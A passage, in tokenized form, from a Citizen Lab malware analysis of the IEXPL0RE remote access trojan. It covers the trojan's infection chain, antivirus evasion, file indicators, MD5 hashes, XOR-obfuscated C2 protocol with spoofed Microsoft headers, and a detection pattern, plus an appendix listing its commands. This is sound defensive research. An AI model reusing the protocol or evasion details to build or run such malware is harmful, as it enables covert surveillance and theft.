"it", "installs", "a", "launcher", "program", "on", "the", "computer", "."], ["Antivirus", "programs", "frequently", "fail", "to", "detect", "the", "launcher", "program", "as", "malicious", ",", "as", "it", "is", "custom", "built", "for", "each", "specific", "target", ":", "the", "file", "contains", "a", "configuration", "file", "unique", "to", "the", "target", ",", "which", "is", "different", "each", "time", "it", "is", "sent", "out", "."], ["This", "method", "is", "used", "to", "defeat", "signature", "-", "based", "antivirus", "programs", ",", "which", "only", "scan", "for", "files", "that", "are", "known", "to", "be", "malicious", "."], ["As", "the", "launcher", "program", "is", "newly", "generated", "every", "time", ",", "it", "will", "never", "end", "up", "on", "a", "signature", "list", "until", "after", "it", "is", "already", "been", "used", "."], ["Once", "installed", "on", "a", "system", ",", "the", "launcher", "program", "goes", "through", "multiple", "programs", "to", "unpack", "a", "contained", "file", "(", "the", "actual", "RAT", ")", "before", "it", "can", "run", "."], ["The", "IEXPL0RE.EXE", "(", "or", "other", "launcher", ")", "program", "contains", "multiple", "programs", ",", "layered", "like", "an", "onion", ",", "which", "eventually", "unpack", "a", "DLL", "(", "dynamic", "link", "library", ",", "another", "form", "of", "executable", "file", ")", "."], ["The", "file", "name", "varies", ",", "but", "starts", "with", "\u201c", "perf", "\u201d", "and", "has", "an", "extension", "of", ".dat", ",", "and", "is", "saved", "to", "the", "%", "temp%", "folder", "(", "often", "C:\\Documents", "and", "Settings\\user\\Local", "Settings\\Temp", ")", "."], ["Once", "the", "perf*.dat", "file", "is", "saved", "to", "disk", ",", "it", "runs", "(", "via", "injection", "into", "svchost.exe", ",", "a", "Windows", "program", ")", "and", "extracts", "another", "DLL", "into", "memory", "."], ["This", "program", "is", "called", "\u201c", "ContainerV2", ",", "\u201d", "as", "it", "is", "referenced", "from", "within", "the", "program", ",", "although", "it", "is", "never", "written", "to", "the", "disk", "."], ["ContainerV2", "connects", "to", "the", "Internet", "and", "downloads", "another", "DLL", "called", "\u201c", "client", "\u201d", "."], ["The", "client", "is", "also", "kept", "in", "memory", "and", "never", "written", "to", "the", "disk", "."], ["Once", "downloaded", ",", "ContainerV2", "will", "run", "the", "client", ",", "which", "does", "all", "of", "the", "IEXPL0RE", "RAT", "work", "(", "figure", "4", ")", "."], ["FIGURE", "4", ":", "STRUCTURE", "OF", "THE", "RAT", "LAUNCHER", "PROGRAM", "."], ["CITIZEN", "LAB", "TECHNICAL", "BRIEF", ":", "IEXPL0RE", "RAT", "6", "For", "Organization", "1", ",", "the", "executable", "launch", "process", "looks", "like", "this", ":", "\u2022\u2022", ".exe(attached", "file", ",", "launcher", "):", "appears", "as", "a", "text", "document", ";", "when", "run", ",", "displays", "a", "fake", "error", "message", "saying", "the", "file", "ca", "n\u2019t", "be", "found", "(", "figure", "5", ")", "\u2022\u2022", "csv.exe", "(", "runs", "and", "exits", "quickly", ")"], ["\u2022\u2022", "360tray.exe", "(", "runs", "and", "exits", "quickly", ")"], ["\u2022\u2022", "svchost.exe", "(", "with", "injected", "perf*.dat", "code", ")"], ["\u2022\u2022", "ContainerV2", "(", "injected", "into", "svchost.exe", ")", "\u2022\u2022", "client", "(", "downloaded", "and", "run", "in", "memory", ")", "FIGURE", "5", ":", "SOCIAL", "ENGINEERING", "TECHNIQUE", ":", "A", "FAKE", "ERROR", "MESSAGE", "HIDING", "THE", "FACT"], ["THAT"], ["THIS", "IS", "A", "PROGRAM", "."], ["One", "advantage", "of", "downloading", "the", "final", "stage", "is", "that", "if", "the", "attacker", "wanted", "to", "update", "the", "RAT", "software", "(", "to", "add", "new", "functionality", "for", "example", ")", ",", "it", "can", "be", "done", "very", "easily", "."], ["Because", "code", "is", "downloaded", "every", "time", "the", "malware", "starts", ",", "if", "the", "code", "is", "changed", "on", "the", "server", "side", ",", "existing", "compromised", "machines", "will", "automatically", "update", "themselves", "the", "next", "time", "they", "are", "restarted", "."], ["Over", "the", "time", "spent", "analyzing", "this", "malware", ",", "the", "client", "program", "did", "have", "minor", "changes", ",", "possibly", "bug", "fixes", "."], ["MD5", "hashes", ",", "also", "called", "message", "digests", ",", "are", "often", "used", "to", "identify", "a", "file", "based", "on", "its", "content", "."], ["A", "hash", "is", "a", "string", "of", "hexadecimal", "characters", "that", "identifies", "a", "file", "."], ["Should", "the", "file", "change", "in", "any", "way", ",", "the", "hash", "will", "as", "well", "."], ["Hashes", "are", "designed", "to", "be", "easy", "to", "compute", "from", "a", "full", "file", ",", "but", "it", "is", "very", "difficult", "to", "find", "two", "files", "with", "the", "same", "hash", "."], ["Use", "of", "hashes", "in", "the", "context", "of", "the", "IEXPL0RE", "RAT", "is", "difficult", ",", "as", "the", "downloaded", "client", "may", "change", ",", "and", "the", "ContainerV2", "program", "is", "different", "for", "every", "target", "."], ["One", "of", "the", "main", "differences", "that", "guarantees", "that", "the", "hash", "will", "always", "be", "unique", "is", "that", "the", "configuration", "file", "for", "the", "RAT", "(", "including", "which", "command", "and", "control", "servers", "to", "connect", "to", ")", "is", "included", "in", "the", "program", "."], ["CITIZEN", "LAB", "TECHNICAL", "BRIEF", ":", "IEXPL0RE", "RAT", "7", "For", "reference", "some", "MD5", "hashes", "of", "IEXPL0RE", "components", "include", ":", "ORIGINAL", "ATTACHMENT", ":", "\u2022"], ["\u2022", "\u2022", "\u2022", "Organization", "1", ":", "d7c826ac94522416a0aecf5b7a5d2afe", "(", "EXE", ")"], ["Organization", "2", ":", "66e1aff355c29c6f39b21aedbbed2d5c", "(", "SCR", ")"], ["Organization", "3", ":", "21a1ee58e4b543d7f2fa3b4022506029", "(", "EXE", ")"], ["Organization", "3", ":", "8d4e42982060d884e2b7bd257727fd7c", "(", "XLS", ")", "CONTAINERV2", ":", "\u2022", "\u2022", "Organization", "1", ":", "d46d85777062afbcda02de68c063b877", "Organization", "2", ":", "85e8c6ddcfa7e289be14324abbb7378d", "ORGANIZATION", "2", "CLIENT"], ["(", "ONLY", "ACTIVE", "COMMAND", "AND", "CONTROL", "SERVER", "):", "\u2022", "\u2022", "November", "1", ",", "2011", ":", "eb51b384fcbbe468a6877f569021c5d1", "November", "29", ",", "2011", ":", "8268297c1b38832c03f1c671e0a54a78", "(", "current", "as", "of", "July", "20", ",", "2012", ")", "INFECTION"], ["Once", "the", "launcher", "program", "is", "run", ",", "it", "will", "install", "the", "IEXPL0RE", "binary", "and", "a", "startup", "link", "in", "the", "Start", "Menu", ":", "C:\\Documents", "and", "Settings\\All", "Users\\Start", "Menu\\Programs\\Startup\\IEXPL0RE.LNK", "C:\\Documents", "and", "Settings\\user\\Application", "Data\\Microsoft\\Internet", "Explorer\\IEXPL0RE.EXE", "It", "also", "leaves", "traces", "of", "the", "extracted", "binary", "and", "the", "link", "file", "(", "the", ".tmp", "file", "below", ")", "in", "%", "temp%", ":", "C:\\Documents", "and", "Settings\\user\\Local", "Settings\\Temp\\31A.tmp", "C:\\Documents", "and", "Settings\\user\\Local", "Settings\\Temp\\perf6cd2e5e9.dat"], ["The", "RAT", "also", "uses", "a", "few", "files", "for", "configuration", "and", "recording", "keystrokes", ":"], ["C:\\WINDOWS\\system\\lock.dat", "C:\\WINDOWS\\system\\MSMAPI32.SRG", "C:\\WINDOWS\\system32\\STREAM.SYS", "When", "run", ",", "IEXPL0RE", "will", "connect", "to", "a", "command", "and", "control", "(", "C2", ")", "server", "for", "updates", ",", "sending", "keylogger", "data", ",", "and", "asking", "for", "RAT", "commands", "."], ["The", "C2", "server", "is", "specified", "in", "a", "configuration", "file", "built", "into", "the", "RAT", "program", "."], ["Each", "RAT", "instance", "is", "likely", "built", "using", "a", "packaging", "program", "."], ["The", "configuration", "file", "allows", "for", "a", "primary", "server", "and", "an", "alternate", ",", "and", "may", "use", "either", "a", "domain", "or", "IP", "."], ["CITIZEN", "LAB", "TECHNICAL", "BRIEF", ":", "IEXPL0RE", "RAT", "8"], ["Each", "of", "the", "IEXPL0RE", "samples", "analyzed", "uses", "a", "different", "set", "of", "C2", "servers", "."], ["One", "sample", "uses", "two", "domains", "that", "point", "to", "the", "same", "IP", "."], ["The", "IP", "changes", "every", "few", "days", "to", "few", "weeks", ",", "but", "remains", "in", "one", "network", "block", "located", "in", "China", "."], ["Other", "samples", "use", "either", "a", "single", "domain", "name", "and", "no", "backup", ",", "or", "a", "fixed", "IP", "with", "a", "localhost", "address", "as", "backup", "."], ["The", "localhost", "address", "is", "a", "way", "to", "find", "and", "use", "a", "proxy", ",", "for", "example", ",", "if", "a", "computer", "is", "using", "a", "circumvention", "system", "such", "as", "Tor", "."], ["Of", "the", "two", "samples", "using", "fixed", "IPs", ",", "both", "were", "sent", "to", "the", "same", "organization", ",", "and", "one", "appears", "to", "be", "a", "replacement", "for", "the", "other", "."], ["Both", "C2", "servers", "are", "currently", "down", "."], ["C2", "COMMUNICATION", "IEXPL0RE", "has", "two", "different", "methods", "of", "communication", ":", "HTTP", "POST", "and", "GET", "."], ["It", "also", "has", "the", "ability", "to", "use", "a", "HTTP", "CONNECT", "proxy", "."], ["POST", "is", "the", "preferred", "method", "of", "communication", ";", "if", "it", "does", "not", "work", ",", "it", "will", "also", "attempt", "a", "GET", "connection", "."], ["All", "communication", "from", "the", "client", "to", "the", "server", "is", "encrypted", "with", "a", "one", "-", "byte", "XOR", "key", "0xCD", "."], ["(", "Information", "in", "this", "report", "shows", "the", "data", "after", "decryption", ".", ")"], ["POST", "commands", "put", "the", "data", "in", "the", "request", "body", ",", "while", "GET", "commands", "put", "the", "data", "in", "URL", "parameters", "."], ["Server", "responses", "are", "all", "200", "OK", "messages", "with", "data", "in", "the", "body", "."], ["The", "system", "keeps", "track", "of", "the", "communication", "using", "a", "sequence", "number", ",", "which", "is", "part", "of", "the", "requested", "URL", "."], ["The", "sequence", "number", "is", "nine", "digits", "long", ",", "starts", "at", "000000001", ",", "and", "generally", "increments", "by", "one", "for", "each", "packet", "sent", "."], ["When", "authenticated", ",", "the", "sequence", "number", "jumps", "to", "000001000", ";", "if", "disconnected", ",", "the", "sequence", "number", "returns", "to", "the", "next", "sub-1000", "number", "expected", "."], ["THE", "HEADERS", "OF", "THE", "REQUEST", "LOOK", "LIKE", "THIS", ":", "POST", "/index000000001.asp"], ["HTTP/1.1", "Accept", "-", "Language", ":", "en", "-", "us"], ["User", "-", "Agent", ":", "Mozilla/4.0", "(", "compatible", ";", "MSIE", "7.0", ";", "Windows", "NT", "5.1", ";)"], ["Host", ":", "update.microsoft.com"], ["Connection", ":", "Keep", "-", "Alive"], ["Content", "-", "Type", ":", "text", "/", "html"], ["Content", "-", "Length", ":", "000041", "The", "Accept", "-", "Language", ",", "User", "-", "Agent", ",", "Connection", ",", "and", "Content", "-", "Type", "headers", "are", "always", "fixed", "."], ["The", "Host", "header", "is", "also", "always", "fixed", "as", "update.microsoft.com", ";", "any", "requests", "to", "the", "C2", "server", "made", "without", "this", "header", "in", "place", "will", "be", "rejected", ",", "often", "with", "a", "redirect", "to", "Microsoft", "\u2019s", "website", "."], ["When", "run", ",", "ContainerV2", "communicates", "with", "the", "C2", "server", ",", "first", "establishing", "a", "socket", "by", "a", "three", "-", "way", "handshake", "."], ["Below", ",", "the", "text", "at", "the", "start", "of", "the", "arrow", "indicates", "the", "packet", "type", ",", "sequence", "number", ",", "and", "connection", "socket", "."], ["For", "example", ",", "\u201c", "POST", "2", "(", "1", ")", "\u201d", "means", "that", "it", "is", "using", "an", "HTTP", "POST", "request", ",", "sequence", "number", "2", ",", "on", "the", "first", "established", "connection", "(", "figure", ".", "6", ")", "."], ["The", "text", "on", "the", "line", "is", "the", "data", "in", "the", "packet", "after", "decryption", "."], ["CITIZEN", "LAB", "TECHNICAL", "BRIEF", ":", "IEXPL0RE", "RAT", "FIGURE", "6", ":", "9", "FIRST", "C2", "CONNECTION"], ["Once", "the", "first", "connection", "has", "been", "established", ",", "a", "second", "connection", "is", "made", "using", "a", "similar", "handshake", "(", "figure", "7", ")", "."], ["FIGURE", "7", ":", "SECOND", "C2", "CONNECTION"], ["When", "the", "second", "connection", "has", "been", "established", ",", "the", "ContainerV2", "program", "uses", "it", "to", "download", "the", "client", "and", "run", "it", "(", "figure", "8)", "."], ["CITIZEN", "LAB", "TECHNICAL", "BRIEF", ":", "IEXPL0RE", "RAT", "10", "FIGURE", "8", ":", "BINARY", "DOWNLOAD", "Once", "control", "has", "been", "handed", "off", "to", "the", "client", ",", "one", "connection", "is", "used", "for", "sending", "keylogger", "data", "from", "the", "client", "to", "the", "server", ",", "and", "the", "other", "connection", "is", "used", "to", "request", "RAT", "commands", "from", "the", "server", "."], ["With", "the", "protocol", "reversed", "(", "see", "Appendix", "B", "for", "a", "full", "listing", "of", "commands", ")", ",", "it", "was", "straightforward", "to", "write", "a", "program", "that", "communicates", "with", "the", "C2", "server", ",", "downloads", "the", "client", ",", "and", "sends", "back", "commands", "as", "desired", "."], ["The", "program", "maintains", "the", "two", "sockets", ",", "sending", "heartbeat", "/", "command", "request", "packets", "at", "a", "specified", "interval", ",", "while", "sending", "back", "empty", "keylogger", "packets", "to", "trick", "the", "server", "into", "thinking", "the", "system", "is", "idle", "(", "figure", "9", ")", "."], ["CITIZEN", "LAB", "TECHNICAL", "BRIEF", ":", "IEXPL0RE", "RAT", "FIGURE", "9", ":", "AN", "EXAMPLE", "OF", "THE", "FAKE", "MALWARE", "CLIENT", "COMMUNICATING", "WITH", "THE", "C2", "SERVER", "."], ["11", "CITIZEN", "LAB", "TECHNICAL", "BRIEF", ":", "IEXPL0RE", "RAT", "12", "CAPABILITIES"], ["The", "IEXPL0RE", "RAT", "contains", "over", "40", "commands", "that", "an", "attacker", "can", "use", "to", "manipulate", "the", "file", "system", "and", "registry", ",", "download", "and", "run", "additional", "programs", ",", "and", "find", "and", "exfiltrate", "data", "."], ["An", "infected", "computer", "defaults", "to", "recording", "keystrokes", "and", "sending", "this", "data", "back", "to", "the", "server", "at", "regular", "intervals", "."], ["The", "additional", "commands", "are", "there", "for", "interactive", "control", "of", "the", "system", "in", "real", "-", "time", "by", "an", "attacker", "."], ["This", "program", "is", "likely", "used", "in", "multiple", "phases", "."], ["After", "infection", ",", "the", "keylogger", "records", "data", "including", "email", "addresses", "and", "passwords", "."], ["Once", "an", "account", "\u2019s", "credentials", "have", "been", "captured", ",", "the", "attacker", "can", "log", "in", "and", "set", "up", "a", "forwarding", "address", "or", "download", "all", "of", "the", "data", "stored", "online", "."], ["Once", "a", "compromised", "machine", "has", "been", "determined", "useful", "by", "looking", "at", "the", "keylogger", "data", ",", "an", "attacker", "can", "use", "the", "RAT", "functionality", "to", "download", "files", "and", "install", "more", "specific", "malware", "-", "for", "example", ",", "a", "Skype", "plugin", "that", "records", "calls", "."], ["While", "post", "-", "infection", "behaviour", "from", "an", "attacker", "against", "a", "real", "target", "has", "not", "been", "observed", "in", "this", "investigation", ",", "this", "is", "a", "standard", "method", "in", "targeted", "attacks", "."], ["One", "particular", "area", "of", "interest", "with", "this", "RAT", "is", "that", "it", "contains", "a", "specific", "functionality", "for", "plugins", "relating", "to", "video", "and", "audio", "capture", "."], ["Each", "time", "the", "malware", "connects", "to", "the", "command", "and", "control", "server", ",", "it", "sends", "a", "list", "of", "all", "video", "capture", "devices", "present", "on", "the", "computer", "."], ["This", "behaviour", "may", "indicate", "that", "the", "attacker", "is", "specifically", "interested", "in", "seeing", "who", "is", "on", "the", "other", "end", "of", "the", "computer", ",", "and", "is", "actively", "collecting", "data", "on", "what", "the", "targets", "look", "like", "."], ["For", "a", "full", "list", "of", "the", "commands", "supported", "by", "IEXPL0RE", "and", "a", "description", "of", "what", "they", "do", ",", "see", "Appendix", "B", ":", "Command", "Enumeration", "."], ["DETECTION", "AND", "MITIGATION"], ["A", "system", "infected", "with", "the", "IEXPL0RE", "RAT", "can", "be", "found", "by", "looking", "for", "presence", "of", "the", "IEXPL0RE", "files", ",", "or", "by", "watching", "network", "traffic", "."], ["In", "addition", "to", "the", "IEXPL0RE.EXE", "file", "itself", ",", "presence", "of", "the", "perf*.dat", "files", "and", "link", "files", "in", "%", "temp%", "are", "an", "indicator", "that", "the", "system", "is", "infected", "."], ["The", "timestamps", "on", "the", "files", "are", "an", "indication", "of", "how", "long", "the", "system", "has", "been", "infected", "."], ["A", "network", "intrusion", "detection", "system", "(", "IDS", ")", "can", "identify", "infected", "machines", "by", "looking", "for", "wellknown", "traffic", "patterns", "."], ["The", "simplest", "of", "these", "is", "checking", "for", "HTTP", "traffic", "to", "/index[0", "-", "9]{9}.asp", "."], ["Blocking", "this", "traffic", "will", "prevent", "the", "infected", "machine", "from", "communicating", "with", "the", "C2", "server", ",", "receiving", "new", "commands", ",", "and", "sending", "back", "keylogger", "data", "."], ["The", "C2", "IP", "or", "hostname", "can", "also", "be", "blocked", "directly", "once", "it", "\u2019s", "found", ",", "at", "the", "network", "level", "or", "(", "as", "a", "temporary", "measure", ")", "in", "the", "infected", "computer", "\u2019s", "hosts", "file", "."], ["CITIZEN", "LAB", "TECHNICAL", "BRIEF", ":", "IEXPL0RE", "RAT", "13", "REMOVAL"], ["A", "running", "copy", "of", "IEXPL0RE", "can", "be", "stopped", "by", "killing", "the", "appropriate", "svchost", "process", "."], ["This", "process", "is", "identifiable", "as", "it", "is", "not", "in", "the", "correct", "place", "in", "the", "process", "tree", "."], ["In", "figure", "10", ",", "this", "is", "the", "last", "process", "in", "the", "list", ",", "PID", "1256", ":", "FIGURE", "10", ":", "PROCESS", "EXPLORER", "SHOWING", "THE", "INFECTED", "SVCHOST.EXE", "PROCESS", "(", "1256", ")", "."], ["The", "process", "can", "be", "killed", "with", "the", "Process", "Explorer", "tool", ",", "part", "of", "the", "Sysinternals", "package", "(", "figure", "10", ")", "."], ["Once", "the", "process", "has", "been", "terminated", ",", "removal", "is", "as", "simple", "as", "deleting", "the", "installed", "files", "(", "see", "the", "section", "on", "Infection", "above", "for", "a", "list", ")", "."], ["CITIZEN", "LAB", "TECHNICAL", "BRIEF", ":", "IEXPL0RE", "RAT", "14", "CONCLUSIONS"], ["The", "IEXPL0RE", "RAT", "is", "a", "good", "example", "of", "the", "current", "state", "of", "APT", "attacks", ",", "especially", "those", "targeting", "human", "rights", "organizations", "and", "NGOs", "."], ["While", "they", "are", "not", "particularly", "advanced", "from", "a", "technical", "standpoint", ",", "they", "are", "custom", "designed", "to", "appeal", "to", "and", "pique", "the", "interest", "of", "the", "recipient", "."], ["The", "attacker", "uses", "social", "engineering", "to", "get", "a", "foot", "in", "the", "door", "of", "an", "organization", "."], ["All", "it", "takes", "is", "for", "one", "user", "to", "run", "a", "malicious", "program", "that", "looks", "like", "a", "legitimate", "video", ",", "spreadsheet", ",", "or", "other", "document", "."], ["Once", "running", "on", "a", "user", "\u2019s", "machine", ",", "the", "program", "will", "silently", "record", "passwords", "and", "provide", "the", "attacker", "a", "way", "of", "accessing", "sensitive", "data", "."], ["This", "report", "describes", "what", "is", "\u201c", "normal", "\u201d", "in", "this", "area", ",", "by", "detailing", "what", "a", "common", "attack", "looks", "like", "at", "each", "step", "of", "the", "way", ",", "from", "when", "an", "email", "is", "first", "received", "to", "when", "data", "leaves", "the", "network", "."], ["Many", "APT", "campaigns", "like", "the", "one", "presented", "in", "this", "report", "exist", "and", "continue", "to", "steal", "data", "every", "day", ",", "but", "are", "both", "avoidable", "and", "correctable", "."], ["The", "IEXPL0RE", "RAT", "is", "under", "active", "development", ",", "as", "both", "the", "client", "and", "server", "components", "are", "continuously", "changing", "."], ["The", "server", "in", "particular", "has", "exhibited", "different", "behavior", "over", "time", ",", "mostly", "related", "to", "blocking", "unauthorized", "access", "from", "the", "outside", "world", "."], ["For", "example", ",", "the", "redirect", "to", "Microsoft", "\u2019s", "website", "when", "referencing", "an", "invalid", "URL", "was", "not", "present", "when", "this", "investigation", "began", "."], ["The", "presence", "of", "development", "work", "or", "upgrades", "implies", "that", "this", "system", "is", "actively", "used", "and", "monitored", "."], ["CITIZEN", "LAB", "TECHNICAL", "BRIEF", ":", "IEXPL0RE", "RAT", "APPENDIX", "A", ":", "CONFIGURATION", "FILE"], ["The", "configuration", "sent", "to", "the", "C2", "server", "on", "initial", "connection", "has", "the", "client", "configuration", "at", "the", "beginning", "(", "figure", "11", ")", ",", "followed", "by", "more", "information", "about", "the", "infected", "computer", "(", "figure", "12", ")", "."], ["FIGURE", "11", ":"], ["CLIENT", "CONFIGURATION", "SENT", "TO", "C2", "15", "CITIZEN", "LAB", "TECHNICAL", "BRIEF", ":", "IEXPL0RE", "RAT", "FIGURE", "12", ":", "DETAILED", "INFORMATION", "ON", "INFECTED", "COMPUTER", "SENT", "TO", "C2", "16", "CITIZEN", "LAB", "TECHNICAL", "BRIEF", ":", "IEXPL0RE", "RAT", "17", "APPENDIX", "B", ":", "COMMAND", "ENUMERATION"], ["The", "following", "is", "a", "list", "of", "all", "commands", "present", "in", "the", "IEXPL0RE", "malware", ",", "and", "a", "detailed", "description", "of", "what", "data", "is", "received", "or", "sent", "over", "the", "network", "for", "each", "command", "."], ["CODE", "COMMAND", "SERVER", "/", "DESCRIPTION", "CLIENT", "0x00"], ["Failure", "C", "Client", "response", "for", "a", "variety", "of", "commands", "to", "indicate", "that", "the", "operation", "did", "not", "succeed", "."], ["0x01", "Success", "C", "Client", "response", "for", "a", "variety", "of", "commands", "to", "indicate", "that", "the", "operation", "succeeded", "."], ["Contains", "variable", "data", "related", "to", "the", "command", "request", "."], ["0x01", "Reply", "file", "does", "not", "exist", "C", "Reply", "file", "for", "plugin", "does", "not", "exist", "."], ["Packet", "contains", ":"], ["[", "4", "]", "-", "Command", "code", "(", "0x01", ")", "0x02", "Reply", "file", "over", "512kB", "C", "Reply", "file", "for", "plugin", "is", "over", "512kB."], ["Packet", "contains", ":"], ["[", "4", "]", "-", "Command", "code", "(", "0x02", ")", "0x03", "Reply", "file", "C", "Reply", "file", "for", "plugin", "."], ["Packet", "contains", ":"], ["[", "var", "]", "-", "buffer", "--", "implemented", "so", "always", "0", "?"], ["0x03"], ["Shutdown", "S", "Sends", "a", "shutdown", "+", "power", "off", "+", "force", "command", "to", "the", "system", "."], ["Requires", "parameters", "0/0", "."], ["0x04"], ["Reboot", "S", "Sends", "a", "reboot", "+", "force", "command", "to", "the", "system", "."], ["Requires", "parameters", "0/0", "."], ["0x06", "Reconnect", "S", "Disconnects", "open", "connections", "and", "reconnects", "."], ["0x07", "Shut", "off", "display", "S", "Sends", "WM_SYSCOMMAND", "message", "SC_MONITORPOWER", "to", "shut", "off", "the", "display", "."], ["0x0B", "Download", "and", "install", "malware", "S", "Downloads", "a", "file", ",", "writes", "it", "to", "disk", ",", "and", "possibly", "executes", "it", "."], ["Packet", "contains", ":"], ["[", "4", "]", "-", "executable", "size"], ["[", "var", "]", "-", "executable"], ["Depending", "on", "configuration", "and", "AV", "software", "present", ",", "writes", "the", "file", "to", "IEXPL0RE.EXE", "(", "in", "application", "data", "folder", ",", "Microsoft", "subfolder", ")", ",", "fxsst.dll", "(", "in", "Windows", "system", "directory", ")", ",", "or", "SENS64.DLL", "(", "in", "temp", "path", ")", "."], ["May", "run", "IEXPL0RE", "."], ["EXE", "depending", "on", "options", ";", "may", "also", "install", "configuration", "file", "(", "STREAM.SYS", "or", "Cache", ")", "."], ["Returns", "failure", "or", "success", "with", "parameters", "0/0", "."], ["0x0C"], ["Install", "dropped", "files", "S", "Checks", "configuration", "file", "options", "and", "moves", "the", "appropriate", "dropped", "files", "to", "the", "correct", "locations", "(", "may", "vary", "depending", "on", "Windows", "version", ")", "."], ["Returns", "failure", "or", "success", "with", "parameters", "0/0", "."], ["CITIZEN", "LAB", "TECHNICAL", "BRIEF", ":", "IEXPL0RE", "RAT", "0x0D"], ["Update", "configuration", "file", "S", "18", "Downloads", "new", "configuration", "parameters", "and", "writes", "the", "updated", "information", "to", "the", "configuration", "file", "."], ["Packet", "option", "2", ":"], ["[", "2", "]", "-", "Value1", "=", "=", "2", "[", "180", "]", "-", "Unused", "?"], ["Packet", "option", "1", ":", "update", "campaign", "name", "?"], ["[", "2", "]", "-", "Value1", "=", "=", "1", "[", "4", "]", "-", "campaign", "name", "length"], ["[", "var", "]", "-", "campaign", "name"], ["Packet", "option", "4", ":", "update", "configuration", "file"], ["[", "2", "]", "-", "Value1", "=", "=", "4"], ["[", "2", "]", "-", "port"], ["[", "2", "]", "-", "unknown", "(", "offset", "264", ")"], ["[", "2", "]", "-", "unknown", "(", "offset", "266", ")"], ["[", "4", "]", "-", "unknown", "(", "offset", "664", ")"], ["[", "1", "]", "-", "unknown", "(", "offset", "274", ")"], ["[", "1", "]", "-", "unknown", "(", "offset", "534", ")"], ["[", "2", "]", "-", "unknown", "(", "offset", "532", ")"], ["[", "2", "]", "-", "unknown", "(", "offset", "270", ")"], ["[", "2", "]", "-", "unknown", "(", "offset", "272", ")"], ["[", "4", "]", "-", "campaign", "name", "length"], ["[", "var", "]", "-", "campaign", "name"], ["[", "4", "]", "-", "C2", "name", "length"], ["[", "var", "]", "-", "C2", "name"], ["[", "4", "]", "-", "unknown", "length"], ["[", "var", "]", "-", "unknown", "(", "unused", "?", ")"], ["[", "4", "]", "-", "unknown", "length"], ["[", "var", "]", "-", "unknown", "(", "offset", "275", ")"], ["[", "4", "]", "-", "unknown", "length"], ["[", "var", "]", "-", "unknown", "(", "offset", "535", ")"], ["[", "4", "]", "-", "unknown", "length"], ["[", "var", "]", "-", "unknown", "(", "offset", "599", ")"], ["Returns", "failure", "or", "success", "with", "parameters", "0/0", "."], ["CITIZEN", "LAB", "TECHNICAL", "BRIEF", ":", "IEXPL0RE", "RAT", "0x0E", "Download", "and", "run", "plugin", "S", "19", "Opens", "a", "new", "connection", "in", "a", "new", "thread", ",", "downloads", "a", "file", ",", "then", "runs", "it", "(", "possibly", "with", "Internet", "Explorer", "credentials", ")", "."], ["This", "looks", "like", "a", "plugin", "activation", "for", "screen", "captures", "and", "audio", "recording", "--", "references", "offscreen.dll", "and", "offsound.dll", "."], ["Packet", "contains", ":"], ["[", "4", "]", "-", "unknown", "(", "field_4", ")"], ["[", "4", "]", "-", "unknown", "length"], ["[", "var", "]", "-", "unknown", "(", "field_8", ")"], ["[", "4", "]", "-", "DLL", "name", "length"], ["[", "var", "]", "-", "DLL", "name"], ["[", "4", "]", "-", "DLL", "arguments", "length"], ["[", "var", "]", "-", "DLL", "arguments"], ["[", "4", "]", "-", "Reply", "filename", "length"], ["[", "var", "]", "-", "Reply", "filename"], ["[", "4", "]", "-", "unknown", "length"], ["[", "var", "]", "-", "unknown", "(", "field_620", ")"], ["[", "4", "]", "-", "unknown", "length"], ["[", "var", "]", "-", "unknown", "(", "field_724", ")"], ["[", "1", "]", "-", "unknown", "(", "field_828", ")"], ["[", "1", "]", "-", "unknown", "(", "field_829", ")"], ["[", "1", "]", "-", "unknown", "(", "field_82A", ")"], ["[", "1", "]", "-", "Add", "process", "ID", ",", "socket", ",", "verb", "to", "DLL", "arguments", "?"], ["[", "1", "]", "-", "Create", "process", "as", "IE", "user", "?"], ["[", "4", "]", "-", "unknown", "length"], ["[", "var", "]", "-", "unknown", "(", "field_82C", ")"], ["[", "4", "]", "-", "unknown", "(", "field_934", ")"], ["Handshake", "for", "the", "new", "connection", "uses", "connection", "number", "-1", "."], ["If", "the", "connection", "is", "successful", ",", "replies", "with", "a", "failure", "packet", ",", "parameters", "0/0", ",", "containing", ":"], ["[", "4", "]", "-", "unknown", "(", "field_4", ")"], ["[", "4", "]", "-", "unknown", "length"], ["[", "var", "]", "-", "unknown", "(", "field_8", ")"], ["[", "4", "]", "-", "DLL", "name", "length"], ["[", "var", "]", "-", "DLL", "name"], ["[", "4", "]", "-", "Reply", "filename", "length"], ["[", "var", "]", "-", "Reply", "filename"], ["[", "4", "]", "-", "unknown", "length"], ["[", "var", "]", "-", "unknown", "(", "field_620", ")"], ["[", "4", "]", "-", "unknown", "length"], ["[", "var", "]", "-", "unknown", "(", "field_724", ")"], ["[", "1", "]", "-", "unknown", "(", "field_828", ")"], ["[", "1", "]", "-", "unknown", "(", "field_829", ")"], ["[", "4", "]", "-", "unknown", "length"], ["[", "var", "]", "-", "unknown", "(", "field_82C", ")"], ["[", "4", "]", "-", "unknown", "(", "field_934", ")"], ["If", "successful", ",", "it", "will", "send", "the", "C2", "an", "X", "command", "."], ["The", "C2", "will", "reply", "with", "a", "file", ",", "which", "the", "client", "writes", "to", "disk", "."], ["The", "client", "will", "send", "a", "success", "or", "failure", "packet", "with", "parameters", "0/0", "depending", "on", "whether", "the", "file", "was", "received", "."], ["If", "field_828", "is", "non", "-", "zero", ",", "the", "client", "will", "send", "the", "contents", "of", "the", "reply", "filename", "specified", "in", "a", "0x03", "command", "with", "parameters", "0/0", "."], ["The", "way", "this", "is", "implemented", ",", "it", "appears", "as", "if", "it", "will", "always", "send", "an", "empty", "packet", "."], ["If", "process", "creation", "is", "unsuccessful", ",", "it", "will", "send", "a", "failure", "packet", "with", "parameters", "0/0", "containing", "the", "following", ":"], ["[", "4", "]", "-", "command", "(", "0x00", ")"], ["CITIZEN", "LAB", "TECHNICAL", "BRIEF", ":", "IEXPL0RE", "RAT", "0x0F", "Download", "and", "execute", "file", "S", "Downloads", "a", "file", "and", "runs", "it", "."], ["Packet", "contains", ":"], ["[", "4", "]", "-", "executable", "size"], ["[", "var", "]", "-", "executable"], ["Downloads", "the", "file", "to", "%", "temp%", "and", "executes", "it", "."], ["Returns", "failure", "or", "success", "with", "parameters", "0/0", "."], ["0x10", "Unknown"], ["S", "Updates", "a", "values", "in", "the", "lock.dat", "file", "and", "sets", "an", "event", "."], ["Packet", "contains", ":"], ["[", "4", "]", "-", "Value", "length"], ["[", "var", "]", "-", "Value"], ["Sets", "the", "DWORD", "at", "lock.dat", "offset", "516", "to", "2", ",", "and", "copies", "the", "value", "from", "the", "packet", "to", "offset", "520", "."], 